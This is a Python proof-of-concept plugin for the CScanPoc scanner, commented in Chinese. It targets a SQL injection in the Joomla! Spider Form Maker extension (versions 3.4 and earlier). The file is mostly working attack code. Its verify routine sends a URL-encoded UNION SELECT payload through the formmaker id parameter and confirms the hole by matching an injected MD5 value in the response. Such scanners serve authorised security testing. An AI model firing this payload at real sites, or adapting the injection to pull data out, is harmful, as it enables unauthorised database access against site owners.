# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'joomla_0016'  # 平台漏洞编号，留空
    name = 'Joomla! Spider Form Maker <=3.4 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-12'  # 漏洞公布时间
    desc = '''
        Joomla! Spider Form Maker <=3.4 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/34637/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = '<=3.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '53ff92c1-1ec4-4604-8a7c-a0aecefe2aff'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = '/index.php?option=com_formmaker&view=formmaker&id=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,CONCAT(0x7165696a71,IFNULL(CAST(md5(3.1415)%20AS%20CHAR),0x20),0x7175647871),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23'
            url = arg + payload
            code, head, res, errcode, _ = hh.http(url)

            if code == 200 and "63e1f04640e83605c1d177544a5a0488" in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
